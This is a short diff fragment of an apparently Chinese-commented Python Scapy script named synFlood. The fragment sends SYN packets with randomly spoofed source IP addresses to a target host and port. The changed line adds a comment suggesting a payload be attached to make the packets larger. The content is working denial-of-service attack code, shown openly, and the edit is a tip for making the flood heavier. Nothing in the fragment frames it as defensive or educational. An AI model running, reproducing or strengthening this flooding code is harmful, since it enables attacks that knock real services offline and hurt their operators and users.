@@ -9,7 +9,7 @@ def synFlood(tgt, dPort):
 			sIP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))) #产生随机IP
 			ipLayer = IP(src=sIP, dst=tgt) 
 			tcpLayer = TCP(sport=sPort, dport=dPort,flags="S") 
-			packet = ipLayer / tcpLayer 
+			packet = ipLayer / tcpLayer   #可尝试在此添加荷载，增大包长度
 			send(packet)
 
 if __name__ == '__main__':
